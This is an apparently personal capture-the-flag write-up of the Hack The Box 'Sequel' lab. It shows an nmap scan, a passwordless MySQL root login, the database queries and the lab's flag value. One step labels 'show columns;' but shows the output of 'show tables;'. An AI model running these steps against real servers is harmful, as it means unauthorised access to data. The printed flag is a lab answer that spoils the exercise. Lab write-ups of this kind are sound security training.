```toc
```
# HTB Notes - Sequel #

+ **Date**: 12-8-2022
+ **Author**: Noah Soqui
+ **Tags**: #SQL #MySQL

## Intelligence Gathering ##

Scanning machine
+ `nmap -sV -sC 10.129.238.21`
+ Output:
``` Shell
Nmap scan report for 10.129.238.21
Host is up (0.044s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
```

## Misconfiguration and Vulnerability Analysis  ##

Can authenticate to the mysql databases without a password using the username "root".

## Exploitation ##

Connect to the SQL database
+ `sudo mysql -u root -h 10.129.238.21` 

## Post Exploitation ##

Look for the database
+ `show databases;`
``` MySQL
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

Connect the the <mark style="background: #BBFABBA6;">htb</mark> database and see available tables 
+ `use htb;`
+ `show columns;`
``` MySQL
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```

Display the <mark style="background: #FFF3A3A6;">config</mark> table to look for the flag 
``` MySQL
MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

## Reporting ##

### Executive Summary ###

MySQl is an implementation of SQL that uses the `mysql` utility to connect to. Navigating the database uses the SQL language, which consists of databases containing tables, and tables containing columns. After connecting with no password, can simply navigate to the flag.


